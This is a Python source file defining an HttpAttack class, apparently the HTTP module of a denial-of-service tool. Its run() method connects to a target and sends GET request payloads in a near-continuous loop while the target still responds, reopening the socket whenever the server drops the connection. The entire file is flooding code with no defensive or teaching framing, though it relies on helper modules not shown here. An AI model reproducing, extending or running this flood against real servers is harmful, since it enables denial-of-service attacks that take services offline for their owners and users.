import socket
from time import sleep

from attacks.http.services import HttpService
from constants import CRLF
from shared.attacks import AttackRequest
from shared.attacks.http import HttpAddress, HTTPMethods


class HttpAttack:
    def __init__(self, attack_request: AttackRequest) -> None:
        self._service = HttpService(attack_request)
        self._attack_request = attack_request
        self._CRLF = CRLF.encode()

    def _get_response(self, sock: socket.socket) -> tuple[bytes, bytes]:
        response = b""
        chuncks = sock.recv(4096)
        while chuncks:
            response += chuncks
            chuncks = sock.recv(4096)
        # NOTE: HTTP headers will be separated from the body by an empty line
        header, _, body = response.partition(self._CRLF + self._CRLF)

        return header, body

    def run(self) -> None:
        """Create and return packet to send"""

        # TODO: Move out this validation
        if not isinstance(self._attack_request.address, HttpAddress):
            raise Exception(f"Please specify HttpAddress instead of {type(self._attack_request.address)}")

        address: HttpAddress = self._attack_request.address
        sock = self._service.get_socket(address.target)

        while self._service.ping(sock):
            try:
                sock.send(self._service.http_payload(method=HTTPMethods.GET))
                sleep(0.0001)

            except (BrokenPipeError, ConnectionResetError):
                sock = self._service.get_socket(address.target)
